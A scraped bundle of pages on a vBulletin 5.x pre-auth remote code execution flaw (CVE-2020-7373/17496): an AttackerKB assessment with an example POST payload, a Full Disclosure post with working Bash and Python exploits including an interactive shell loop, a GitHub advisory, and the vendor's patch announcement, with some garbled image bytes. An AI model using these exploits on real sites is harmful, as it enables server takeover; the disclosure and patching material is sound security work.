Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

##### Privilege Escalation

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Exploitation for Privilege Escalation

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Group Policy Modification

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Submit

[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)

### Topic Tags

Select the tags that apply to this CVE (Assessment added tags are disabled and cannot be removed)

What makes this of high-value to an attacker?

Vulnerable in default configuration

Unauthenticated

Observed in state-sponsored attacks

Observed in ransomware attacks

Gives privileged access

Easy to weaponize

Difficult to patch

Common in enterprise

CISA KEV Listed

What makes this of low-value to an attacker?

Vulnerable in uncommon configuration

Requires user interaction

Requires physical access

Requires elevated access

No useful access

Difficult to weaponize

Authenticated

Submit

## Description

vBulletin 5.5.4 through 5.6.2 allows remote command execution via crafted subWidgets data in an ajax/render/widget\_tabbedcontainer\_tab\_panel request. NOTE: this issue exists because of an incomplete fix for CVE-2019-16759. ALSO NOTE: CVE-2020-7373 is a duplicate of CVE-2020-17496. CVE-2020-17496 is the preferred CVE ID to track this vulnerability.

[See More
See Less](#description)

* [Ratings & Analysis](#ratings-analysis)
* [Vulnerability Details](#vuln-details)

## Add Assessment

[Log in to add an Assessment](/login)

3

[![](https://avatars.githubusercontent.com/u/2058303?v=4&s=50)](/contributors/zeroSteiner)

**[zeroSteiner (345)](/contributors/zeroSteiner)**
![](/static/public/img/Badges-50-assessments.svg)

![](/static/public/img/Badges-3rd-Place.svg)

[August 13, 2020 9:24pm UTC (4 years ago)](/assessments/b63702d5-0ed9-404d-9211-4dd0fed7e30e)•Edited 4 years ago

###### Ratings

* Attacker Value
  High
* Exploitability
  Very High
[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Unauthenticated](/search?q=pre_auth&qt=tag)
###### Technical Analysis

This vulnerable allows an unauthenticated attacker to run arbitrary PHP code or operating system commands on affected versions of the vBulletin web application. The vulnerability, which was also discovered by Zenofex, is identified as CVE-2020-7373 and is effectively a bypass for a previously patched vulnerability identified as CVE-2019-16759. Administrators running vBulletin should patch this one immediately.

Example POST request that would trigger the vulnerability:

```
POST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1
Host: 192.168.249.2
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
subWidgets%5b0%5d%5btemplate%5d=widget_php&subWidgets%5b0%5d%5bconfig%5d%5bcode%5d=echo%20shell_exec%28base64_decode%28%27ZWNobyB3elV4d2VJag%3d%3d%27%29%29%3b%20exit%3b

```

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/b63702d5-0ed9-404d-9211-4dd0fed7e30e)
[Delete Assessment and Exploited in the Wild Report](/assessments/b63702d5-0ed9-404d-9211-4dd0fed7e30e)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-b63702d5-0ed9-404d-9211-4dd0fed7e30e)

##### CVSS V3 Severity and Metrics

Data provided by the [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
Base Score:

9.8 Critical

Impact Score:

5.9

Exploitability Score:

3.9

Vector:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Attack Vector (AV):

Network

Attack Complexity (AC):

Low

Privileges Required (PR):

None

User Interaction (UI):

None

Scope (S):

Unchanged

Confidentiality (C):

High

Integrity (I):

High

Availability (A):

High

### General Information

Offensive Application
Unknown
Utility Class
Unknown
Ports

Unknown

OS

Unknown

Vulnerable Versions
n/a
Prerequisites

Unknown

Discovered By

Unknown

PoC Author

Unknown

Metasploit Module

Unknown

Reporter

Unknown

### Vendors

* vbulletin

### Products

* vbulletin

### References

##### Canonical

[CVE-2020-7373 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7373)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7373)
##### Miscellaneous

<https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/><https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch><https://seclists.org/fulldisclosure/2020/Aug/5><https://github.com/rapid7/metasploit-framework/pull/13970>

### Additional Info

Authenticated

Unknown
Exploitable

Unknown
Reliability

Unknown
Stability

Unknown
Available Mitigations

Unknown
Shelf Life

Unknown
Userbase/Installbase

Unknown
Patch Effectiveness

Unknown

![](/static/public/img/rapid7-avatar.svg)

Rapid7

###### Technical Analysis

# Report as Emergent Threat Response

Please provide the link to the ETR blog if available.

Add a reference URL (optional):

Report as ETR
Update Report

# Report as Exploited in the Wild

AttackerKB users want to know this is information they can trust.

Help the community by indicating the source(s) of your knowledge:

* Vendor Advisory

  Add a reference URL
  (required):

  Please provide a link to the Vendor Advisory.
* Government or Industry Alert

  Add a reference URL
  (required):

  Please provide a link to the Government or Industry Alert.
* Threat Feed

  Add a reference URL
  (required):

  Please provide a link to the Threat Feed.
* News Article or Blog

  Add a reference URL
  (required):

  Please provide a link to the News Reference.
* Exploitation personally observed in an environment (client, customer, employer, or personal environment)

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/aIL9b0uOYc/cve-2020-7373/assess) as evidence to support your personal observation claim.
* Other:

  Please explain the source of your report.

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/aIL9b0uOYc/cve-2020-7373/assess) as evidence of the source of your report.

Report and add more details
Report as Exploited
Update Report

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

Cancel
Submit

![](/static/public/img/close-white.svg)
## Quick Cookie Notification

This site uses cookies for anonymized analytics to improve the site.

Rapid7 will never sell the data collected on this site.

I AGREE, LET’S GO!

---

View our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/) for full details

This site uses cookies for anonymized analytics. For more information or to change your cookie settings, view our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/).

![](/static/public/img/close-white.svg)

[Terms of Use](/terms)
[Code of Conduct](/codeofconduct)
[FAQ](/faq)
[Changelog](/changelog)
[Privacy Policy](https://rapid7.com/privacy-policy)
Contact
[API](https://api.attackerkb.com/v1/api-docs/docs)
[A Rapid7 Project](https://www.rapid7.com)

[![](/static/public/img/logo-condensed-dark.png)](/)



=== Content from seclists.org_33d021e0_20250119_124357.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# Remote Code Execution 0day in vBulletin 5.x

---

*From*: Zenofex via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Sun, 9 Aug 2020 16:58:27 -0500

---

```
vBulletin 5.5.4 through 5.6.2 are vulnerable to a remote code execution
vulnerability caused by incomplete patching of the previous
"CVE-2019-16759" RCE. This logic bug allows for a single pre-auth request
to execute PHP code on a target vBulletin forum.

More info can be found at:
<https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/>

Exploits below.

Thank you,
Zenofex

BASH Exploit:

#!/bin/bash
#
# vBulletin (widget_tabbedcontainer_tab_panel) 5.x 0day by @Zenofex
#
# Usage ./exploit <site> <shell-command>

# Urlencode cmd
CMD=`echo $2|perl -MURI::Escape -ne 'chomp;print uri_escape($_),"\n"'`

# Send request
curl -s $1/ajax/render/widget_tabbedcontainer_tab_panel -d
'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20shell_exec("'+$CMD+'");exit;'

Python Exploit:

#!/usr/bin/env python3
# vBulletin 5.x pre-auth widget_tabbedContainer_tab_panel RCE exploit by
@zenofex

import argparse
import requests
import sys

def run_exploit(vb_loc, shell_cmd):
    post_data = {'subWidgets[0][template]' : 'widget_php',
'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % shell_cmd}
    r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' %
vb_loc, post_data)
    return r.text

ap = argparse.ArgumentParser(description='vBulletin 5.x Ajax Widget
Template RCE')
ap.add_argument('-l', '--location', required=True, help='Web address to
root of vB5 install.')
ARGS = ap.parse_args()

while True:
    try:
        cmd = input("vBulletin5$ ")
        print(run_exploit(ARGS.location, cmd))
    except KeyboardInterrupt:
        sys.exit("\nClosing shell...")
    except Exception as e:
        sys.exit(str(e))

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **Remote Code Execution 0day in vBulletin 5.x** *Zenofex via Fulldisclosure (Aug 11)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from avatars.githubusercontent.com_5c718ed9_20250119_141610.html ===
���� �  

 $.' ",#(7),01444'9=82<.342 
2!!22222222222222222222222222222222222222222222222222��  ( (" ���          
   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�������������������������������������������������������������������������       
  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �BkgH�'���bRK���Tz}k�z?�/-���J� �O$�+:�iht�K�4�<-� ��2�HQ��W�����u����r/?�{�jV\_c}�v���+��Ϥ�ʠ�F<и�s��+��^�}j4�ǋ����R�>Z\_I䍱�0�����;��CVv'�V[��f
��K�������$��#�\�(v��:����W�x\k�)RGD�nOF!G'�Xֽ�u�y���[I 0��\##s
�۞�� Z��>{�1�73)�ٛ;I~\ս<bWu�c�d����ۏ֙�`�juIn�#'�s\�m��H�1�<kĖ�z��fs1�h.z�df��uY/o����K+�l�}�}O�]��X�fӓkb�@ `��u~y^��O�� =����5u�?�c����� BZ��%��"=6�Q�#�ă��o��܏
A4�C=ʀ ��v�w��?�z�/ȯg� \_+� ��sS��J����r�d�(\*�Ԛo��z��N��J}u��?��

=== Content from avatars.githubusercontent.com_1d70bdd2_20250119_141607.html ===
���� JFIF  ` `  �� ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
�� C 



�� C  

��  ( (" ��           
�� �   } !1AQa"q2���#B��R��$3br�
%&'()\*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������        
�� �  w !1AQaq"2�B���� #3R�br�
$4�%�&'()\*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������   ? �� o�}����?���Wv�掁T�@?\ʼgE��y���s�U����6��1�z��Ʌg���޽���[�:\%k�Ŗ��S���
�������@�pi\_i��4JBq&� ��0'�J��5=d����Q9hT��\*r}?S�ˏ�>.��渼�GI���\*���}O>���~��(�������-�hA �= �Gn�����[Hu��t3!�c�O����\_>|\_KmF�L��Q�}�r8��F����l}f'
rS�����=��?�~�$1r���w)<������}1Er�l������a6�X�%�B,#��IϠ\_j+���-��g�M�NO������Jťh�n�q�s�ݝz��^���]�J��t�R�]>�J
�\*���d�Q�1�י��?�M��w�ɦX�Y[ĭq��4b\;UB1��#9�{���!��F�R�Z��-V���U�����8�03r#�+��a�$�Wm��[C��Tk>��N7�>,�7���I��6���,>V�9�A=��r�^I}�2��|�Aج�� �"I!;�O�=���O���Eq$�{�����.Ny-�q��]O��C}���6���#���u�\��F�� 8y��¸J�������k��!k�s���c���-��{��1�;�3��d+� 
Ǐ@Z+ԯ�c��0��t��Z埗5�ng��ee�3�ɟU,3�f���e�(�l�>
B�vG��o���/,�k��&&�0�&W����{��;{/I7Jys%�D����a���ڊ+í��'�ٟk�����[�"�#���薑�&}`��[� �]�:g����^�+�>x.mU�,��&̒F�8?�'"�+�Vj�9'��qNM3N�� �(4©&���<[�~�FT��Cl�w�Q\���Q�1��)����

=== Content from github.com_e0e1c175_20250119_141607.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-mvwh-2m72-5jm7)

**CVE-2020-7373**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-mvwh-2m72-5jm7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2020-7373](/advisories/GHSA-mvwh-2m72-5jm7)

## vBulletin 5.5.4 through 5.6.2 allows remote command...

Critical severity

Unreviewed

Published
May 24, 2022
to the GitHub Advisory Database
•
Updated Jan 29, 2023

## Package

No package listed—
[Suggest a package](/advisories/GHSA-mvwh-2m72-5jm7/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

vBulletin 5.5.4 through 5.6.2 allows remote command execution via crafted subWidgets data in an ajax/render/widget\_tabbedcontainer\_tab\_panel request. NOTE: this issue exists because of an incomplete fix for [CVE-2019-16759](https://github.com/advisories/GHSA-c7wq-5768-48mp "CVE-2019-16759"). ALSO NOTE: [CVE-2020-7373](https://github.com/advisories/GHSA-mvwh-2m72-5jm7 "CVE-2020-7373") is a duplicate of [CVE-2020-17496](https://github.com/advisories/GHSA-j77p-6wx9-cjqq "CVE-2020-17496"). [CVE-2020-17496](https://github.com/advisories/GHSA-j77p-6wx9-cjqq "CVE-2020-17496") is the preferred CVE ID to track this vulnerability.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2020-7373>
* [rapid7/metasploit-framework#13970](https://github.com/rapid7/metasploit-framework/pull/13970)
* <https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/>
* <https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch>
* <https://seclists.org/fulldisclosure/2020/Aug/5>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2020-7373)
Oct 30, 2020

Published to the GitHub Advisory Database
May 24, 2022

Last updated
Jan 29, 2023

### Severity

Critical

### [EPSS score](https://www.first.org/epss/user-guide)

14.135%
 (96th percentile)

### Weaknesses

[CWE-77](/advisories?query=cwe%3A77)

### CVE ID

CVE-2020-7373

### GHSA ID

GHSA-mvwh-2m72-5jm7

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-mvwh-2m72-5jm7/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from forum.vbulletin.com_e6d92716_20250119_124349.html ===


* Login or Sign Up
  + Logging in...

    Remember me

    Log in

    Or
    [Sign Up](https://forum.vbulletin.com/register?urlpath=aHR0cHM6Ly9mb3J1bS52YnVsbGV0aW4uY29tLy9mb3J1bS92YnVsbGV0aW4tYW5ub3VuY2VtZW50cy92YnVsbGV0aW4tYW5ub3VuY2VtZW50c19hYS80NDQ1MjI3LXZidWxsZXRpbi01LTYtMC01LTYtMS01LTYtMi1zZWN1cml0eS1wYXRjaA%3D%3D)

    [Forgot password or user name?](https://forum.vbulletin.com/lostpw)
  + Log in with
    Facebook
    Sign-in with Twitter
    Sign-in with Google

[![Logo](images/misc/vb_logo_darkblue.svg "Powered by vBulletin")](https://forum.vbulletin.com/)

* + Search in titles only
    Search in vBulletin Announcements only
    Search
  + Advanced Search

* Forums
* [Articles](articles)
* [Blogs](blogs)
* [Add-ons](add-ons)
* [Purchase](https://www.vbulletin.com/purchases/)

* [Trending Topics](trending)
* [Member List](memberlist)
* [Calendar](calendar)

* [Home](https://forum.vbulletin.com)
* [Forum](https://forum.vbulletin.com/forum)
* [vBulletin Announcements](https://forum.vbulletin.com/forum/vbulletin-announcements)
* [vBulletin Announcements](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa)

* Welcome to the vBulletin support forums! In our community forums you can receive professional support and assistance with any issues you might have with your vBulletin Products.

  Useful Links for Guests: [Community Registration](https://forum.vbulletin.com/register) | [vBulletin System Requirements](https://forum.vbulletin.com/node/4387853) | [vBulletin Installation Guide](https://forum.vbulletin.com/node/4391348)

  If you are having problems posting in the relevant areas for your software, please see this [topic](https://forum.vbulletin.com/forum/vbulletin-sales-and-feedback/site-feedback/81568-why-can-t-i-post-or-download-files#post3514457).
* **Telephone Sales and Support Status**

  Due to Martin Luther King Day in the United States, our telephone services will be closed on Monday January 20th. This includes both the Sales and Support lines. Service will resume again during normal business hours on Tuesday, January 21st.

  We apologize for any inconvenience this may cause.

# vBulletin 5.6.0, 5.6.1, 5.6.2 Security Patch

Collapse

X

Collapse

* [Posts](#thread-view-tab)
* [Latest Activity](#stream-view-tab)
* [Photos](#media-view-tab)

* Page

  of
  1
* Filter

* Time
  All Time
  Today
  Last Week
  Last Month
* Show
  All
  Discussions only
  Photos only
  Videos only
  Links only
  Polls only
  Events only

Filtered by:

Clear All

 new posts

Previous
[template](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch)
Next

* [![Wayne Luke](./core/custompics/avatar/avatar868_18.png "Wayne Luke")](https://forum.vbulletin.com/member/868-wayne-luke)

  **[**Wayne Luke**](https://forum.vbulletin.com/member/868-wayne-luke)**

  vBulletin Technical Support Lead
  + Join Date: Aug 2000
  + Posts: 75434
  + vBulletin Version: 6.X
  + [Share](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch%23post4445227)
  + [![](data:image/svg+xml...)
    Tweet](https://twitter.com/intent/tweet?text=vBulletin+5.6.0%2C+5.6.1%2C+5.6.2+Security+Patch&url=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch%23post4445227)

  ---

  [#1](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch#post4445227)

  ## vBulletin 5.6.0, 5.6.1, 5.6.2 Security Patch

  Mon 10 Aug '20, 2:58pm

  A security issue has been reported to the vBulletin team. To fix this issue, we have created a new security patch.

  You can download the patch for your version in the [Member's Area](http://members.vbulletin.com/patches.php)

  We have made patches available for the following versions of vBulletin Connect:

  + 5.6.2
  + 5.6.1
  + 5.6.0
  ## Installing the Patch

  1. Download the appropriate files for your version of vBulletin 5.6.X
  2. Upload all files found within the zip file. Make sure to overwrite the existing files on your server.
  ## Older Versions

  All older versions should be considered vulnerable. Sites running older versions of vBulletin need to be upgraded to vBulletin 5.6.2 as soon as possible. For more information on upgrading please see [Quick Overview: Upgrading vBulletin Connect](https://forum.vbulletin.com/node/4391346) in the support forums.

  ## vBulletin Cloud

  vBulletin Cloud sites are not affected by this issue.

  Translations provided by Google.

  ---

  Wayne Luke

  [The Rabid Badger](http://forums.rabidbadger.io) - a vBulletin Cloud demonstration site.

  [vBulletin 5 API](http://vb5support.com/api)

  **Tags:**
  None
  👍

  4

* [![Wayne Luke](./core/custompics/avatar/avatar868_18.png "Wayne Luke")](https://forum.vbulletin.com/member/868-wayne-luke)

  **[**Wayne Luke**](https://forum.vbulletin.com/member/868-wayne-luke)**

  vBulletin Technical Support Lead
  + Join Date: Aug 2000
  + Posts: 75434
  + vBulletin Version: 6.X
  + [Share](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch%3Fp%3D4445228%23post4445228)
  + [![](data:image/svg+xml...)
    Tweet](https://twitter.com/intent/tweet?text=&url=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch%3Fp%3D4445228%23post4445228)

  ---

  [#2](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch?p=4445228#post4445228)

  Mon 10 Aug '20, 3:01pm

  **Q: I am using the 5.6.3 Beta is there a patch?**

  A: No. This is pre-release software and should not be used on a production site. In order to secure your site follow the steps below:
